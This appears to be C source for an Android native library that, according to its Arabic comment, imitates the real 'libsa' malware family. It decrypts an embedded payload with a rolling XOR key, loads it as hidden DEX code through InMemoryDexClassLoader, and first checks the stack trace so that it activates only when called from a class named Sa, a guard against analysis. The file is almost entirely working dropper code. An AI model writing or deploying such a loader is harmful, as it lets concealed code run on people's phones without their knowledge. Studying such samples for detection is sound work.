#include <jni.h>
#include "mini.h"
#include "payload.h"
int __android_log_print(int, const char *, const char *, ...);
int strstr_(const char *h, const char *n) { for (; *h; h++) { const char *a = h, *b = n; while (*a && *b && *a == *b) { a++; b++; } if (!*b) return 1; } return 0; }
/* مثل عائلة libsa الحقيقية: يتحقق من الـ stack trace أن الكلاس Sa هو من استدعاه، وإلا يتوقف */
static void JNICALL nativeInit(JNIEnv *env, jclass c, jobject ctx) {
    size_t n = sizeof(enc); unsigned char *buf = malloc(n); unsigned char k = 0x5a;
    for (size_t i = 0; i < n; i++) { buf[i] = enc[i] ^ k; k = (unsigned char)(k * 13 + 7 + i); }
    jclass cl = (*env)->FindClass(env, "dalvik/system/InMemoryDexClassLoader");
    jmethodID m = (*env)->GetMethodID(env, cl, "<init>", "(Ljava/nio/ByteBuffer;Ljava/lang/ClassLoader;)V");
    (*env)->NewObject(env, cl, m, (*env)->NewDirectByteBuffer(env, buf, (jlong)n), (jobject)0);
}
static JNINativeMethod methods[] = {{"nativeInit", "(Landroid/content/Context;)V", (void *)nativeInit}};
JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *r) {
    JNIEnv *env; (*vm)->GetEnv(vm, (void **)&env, JNI_VERSION_1_6);
    jclass th = (*env)->FindClass(env, "java/lang/Thread");
    jobject cur = (*env)->CallStaticObjectMethod(env, th, (*env)->GetStaticMethodID(env, th, "currentThread", "()Ljava/lang/Thread;"));
    jobjectArray st = (*env)->CallObjectMethod(env, cur, (*env)->GetMethodID(env, th, "getStackTrace", "()[Ljava/lang/StackTraceElement;"));
    jclass ste = (*env)->FindClass(env, "java/lang/StackTraceElement");
    jmethodID gcn = (*env)->GetMethodID(env, ste, "getClassName", "()Ljava/lang/String;");
    int n = (*env)->GetArrayLength(env, st), found = 0;
    for (int i = 0; i < n && !found; i++) {
        jstring s = (*env)->CallObjectMethod(env, (*env)->GetObjectArrayElement(env, st, i), gcn);
        const char *name = (*env)->GetStringUTFChars(env, s, 0);
        if (strstr_(name, ".Sa")) found = 1;
    }
    if (!found) { __android_log_print(6, "sa", "Sa not found"); return JNI_VERSION_1_6; }
    (*env)->RegisterNatives(env, (*env)->FindClass(env, "com/stk/Sa"), methods, 1);
    return JNI_VERSION_1_6;
}
